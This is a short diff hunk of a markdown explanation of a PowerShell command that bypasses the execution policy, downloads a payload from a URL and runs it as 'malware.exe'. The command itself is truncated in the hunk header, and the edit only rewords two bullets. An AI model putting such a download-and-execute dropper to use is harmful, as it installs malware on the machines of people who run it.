@@ -74,5 +74,5 @@ powershell -ExecutionPolicy Bypass -Noprofile -Command "invoke-Webrequest -URL '
 ### Full Command Breakdown:
 -ExecutionPolicy Bypass: Temporarily bypasses the PowerShell script execution policy to allow the script to run without restriction.
 -NoProfile: Prevents loading of the user profile, which speeds up the execution and avoids potential conflicts.
-- Invoke-WebRequest: Downloads the payload (payload.exe) from the provided GitHub URL.
-- Start-Process: Runs the downloaded malware.exe file.
+-Invoke-WebRequest: Downloads the payload (payload.exe) from the provided URL.
+-Start-Process: Runs the downloaded malware.exe file.
